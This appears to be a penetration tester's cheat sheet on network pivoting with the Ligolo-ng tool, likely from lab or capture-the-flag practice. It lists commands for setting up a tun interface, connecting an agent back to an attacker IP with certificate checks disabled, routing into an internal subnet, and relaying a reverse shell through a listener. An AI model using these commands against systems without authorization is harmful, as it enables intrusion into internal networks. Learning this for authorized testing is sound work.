#####################################################################
  _   _               _             _      ____           _        
 | \ | | _____      _| |_ ___  _ __| | __ |  _ \ __ _ ___| |_ __ _ 
 |  \| |/ _ \ \ /\ / / __/ _ \| '__| |/ / | |_) / _` / __| __/ _` |
 | |\  |  __/\ V  V /| || (_) | |  |   <  |  __/ (_| \__ \ || (_| |
 |_| \_|\___| \_/\_/  \__\___/|_|  |_|\_\ |_|   \__,_|___/\__\__,_|


#####################################################################




{{{ # Redirection 


# Ligolo-ng
https://github.com/nicocha30/ligolo-ng


# Adds a new tun interface to our machine.
sudo ip tuntap add user kali mode tun ligolo

# Enables the new interface.
sudo ip link set ligolo up

# Newer versions you can create the tunnel within the proxy


# With the -selfcert flag the tool dynamically 
# generates self-signed certificates.

./proxy -selfcert

# The IP will be the IP of our Kali VM/attacking machine.
# The -ignore-cert ignores certificate validation. 
# This means we won't have any issues with our self-signed certs.

./agent -connect 10.10.14.213:11601 -ignore-cert


# view sessions in proxy
sessions

# add a route to the new network
sudo ip route add 172.16.5.0/24 dev ligolo


# reverse shell
# Creates a listener on the machine where we're running the agent at port 1234
# and redirects the traffic to port 4444 on our machine.
# You can use other ports, of course.

listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444

# view listeners
listener_list



}}}





